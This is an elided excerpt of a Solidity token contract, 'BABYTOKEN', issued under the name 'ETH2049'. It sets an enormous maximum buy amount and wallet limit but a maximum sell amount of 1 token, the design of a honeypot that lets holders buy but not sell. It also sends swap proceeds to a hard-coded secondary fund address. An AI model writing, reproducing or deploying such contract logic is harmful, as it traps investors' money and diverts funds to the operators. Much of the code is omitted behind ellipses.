...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        maxBuyAmount = 100000000000000000000000000 * 10** Decimals;
        maxSellAmount = 1 * 10** Decimals;
        walletLimit =  1000000000000000000000000000 * 10** Decimals;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0x55AAFec1Fce1dD895140b8ebeD79B634E45DE063;//
...
contract BABYTOKEN is AbsToken {
    constructor() AbsToken(
        ...
        unicode"ETH2049",//Name
        unicode"ETH2049",//Symbol
        18,//Decimals
        20000000000,//Supply
        address(0x7db6544e71E215beaB14131b0097678CD828aBa9),//FundAddress
        address(0x7db6544e71E215beaB14131b0097678CD828aBa9)//ReceiveAddress
    ){
    }
}